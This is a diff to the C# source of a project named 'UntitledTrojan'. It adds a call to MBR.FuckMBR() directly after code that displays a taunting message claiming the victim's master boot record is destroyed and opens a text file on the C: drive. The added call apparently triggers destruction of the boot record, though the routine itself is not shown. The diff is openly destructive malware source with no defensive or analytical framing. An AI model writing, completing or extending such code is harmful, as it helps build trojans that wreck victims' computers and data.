@@ -13,6 +13,7 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using UntitledTrojan.Payloads;
 using UntitledTrojan.Properties;
+using UntitledTrojan.Tools;
 
 namespace UntitledTrojan
 {
@@ -69,6 +70,8 @@ namespace UntitledTrojan
                     "\nDo not try to reboot or close me! Your MBR already has been fucked!" +
                     "\n\nTry to use your PC as long as you can!");
                 Process.Start(@"C:\YOU GOT FUCKED.txt");
+
+                MBR.FuckMBR();
             }
         }
 
